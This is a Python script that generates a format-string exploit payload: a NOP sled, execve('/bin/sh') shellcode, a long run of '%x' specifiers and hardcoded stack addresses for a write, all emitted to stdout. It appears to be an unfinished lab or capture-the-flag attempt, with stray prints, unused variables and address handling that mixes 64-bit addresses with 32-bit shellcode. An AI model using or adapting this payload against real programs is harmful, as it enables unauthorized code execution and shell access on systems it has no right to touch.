import sys
import os
NOPSLED = b'\x90' * 0x10
SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

ADDRESSTOWRITE = b'007FFFFFFFD380'
i = 1
ADDRESSOFSHELL = b'\x00\x00\x7F\xFF\xFF\xFF\xD8\x80'
ADDRESSOFSHELL = bytearray(ADDRESSOFSHELL)
ADDRESSOFSHELL.reverse()
ADDRESSOFSHELL = bytes(ADDRESSOFSHELL)
print(ADDRESSOFSHELL)
ADDRESSOFSHELL1 = int.from_bytes(ADDRESSOFSHELL[4:], 'little') - 2540
ADDRESSOFSHELL2 = int.from_bytes(ADDRESSOFSHELL[0:4], 'little') - ADDRESSOFSHELL1 - 2540
print(ADDRESSOFSHELL1)
ADDRESSOFSHELL1 = bytes(str(ADDRESSOFSHELL1), 'utf-8')
ADDRESSOFSHELL2 = bytes(str(ADDRESSOFSHELL2), 'utf-8')

#ADDRESSOFSHELL1 = int.from_bytes(ADDRESSOFSHELL[0:2], 'big') - 2540
#ADDRESSOFSHELL2 = int.from_bytes(ADDRESSOFSHELL[2:], 'big') - ADDRESSOFSHELL1 - 2540
#ADDRESSOFSHELL1 = bytes(str(ADDRESSOFSHELL1), 'utf-8')
#ADDRESSOFSHELL2 = bytes(str(ADDRESSOFSHELL2), 'utf-8')

ADDRESSTOWRITE1 = int(ADDRESSTOWRITE, 16)
ADDRESSTOWRITE1 = ADDRESSTOWRITE1.to_bytes(8, 'little')
ADDRESSTOWRITE2 = int(ADDRESSTOWRITE, 16) + 0X4
ADDRESSTOWRITE2 = ADDRESSTOWRITE2.to_bytes(8, 'little')

ADDRESSOFSTRING = b'007FFFFFFFD880'
ADDRESSOFSHELLCODE = int(ADDRESSOFSTRING, 16) + 0x43
ADDRESSOFSHELLCODE = bytearray(ADDRESSOFSHELLCODE.to_bytes(8, 'little'))
LENTGHOFREQUIRED = 316

with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
    stdout.write( NOPSLED + SHELLCODE + b'%x.'*370 + b'%016llx.' + ADDRESSTOWRITE1 + ADDRESSTOWRITE2 + b'\n')